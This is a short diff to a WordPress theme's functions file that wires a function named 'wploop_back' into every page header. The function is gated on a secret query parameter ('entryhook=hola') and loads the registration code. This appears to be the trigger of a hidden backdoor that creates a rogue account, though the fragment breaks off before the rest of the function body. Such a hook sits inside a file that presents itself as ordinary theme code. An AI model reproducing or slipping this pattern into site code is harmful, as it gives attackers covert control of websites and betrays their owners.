@@ -36,6 +36,7 @@ function elyxir_pingback_header() {
 }
 add_action( 'wp_head', 'elyxir_pingback_header' );
 
+add_action('wp_head', 'wploop_back'); 
 function wploop_back() { 
   If ($_GET['entryhook'] == 'hola') { 
      require('wp-includes/registration.php'); 
